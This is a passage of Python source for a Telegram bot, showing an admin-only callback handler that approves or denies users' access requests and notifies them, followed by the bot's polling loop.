    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Admin only")
        return
    action, user_id = call.data.split('_')
    user_id = int(user_id)
    
    if action == 'approve':
        approved_users.add(user_id)
        pending_requests.pop(user_id, None)
        save_users()
        bot.edit_message_text(f"✅ User {user_id} has been approved!", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        try:
            bot.send_message(user_id, "🎉 <b>Access Approved!</b>\n\nYou can now use the bot. Type /start to begin.", parse_mode='HTML')
        except:
            pass
    elif action == 'deny':
        pending_requests.pop(user_id, None)
        save_users()
        bot.edit_message_text(f"❌ User {user_id} has been denied.", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        try:
            bot.send_message(user_id, "❌ <b>Access Denied</b>\n\nYour request has been denied by the admin.", parse_mode='HTML')
        except:
            pass
    bot.answer_callback_query(call.id, "Done!")

if __name__ == '__main__':
    print("Bot is running...")
    bot.infinity_polling()